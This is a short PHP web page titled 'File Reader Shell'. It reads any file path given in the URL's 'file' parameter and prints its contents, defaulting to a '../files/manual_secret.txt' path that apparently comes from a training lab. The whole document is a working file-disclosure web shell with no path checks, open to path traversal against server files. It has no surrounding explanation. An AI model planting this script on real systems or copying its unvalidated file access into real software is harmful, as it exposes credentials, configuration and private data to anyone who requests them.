<?php
   echo "<h3>File Reader Shell</h3>";
   $file = $_GET['file'] ?? '../files/manual_secret.txt';
   echo "<pre>";
   echo "Reading: $file\n\n";
   if (file_exists($file)) {
       echo file_get_contents($file);
   } else {
       echo "File not found!";
   }
   echo "</pre>";
   ?>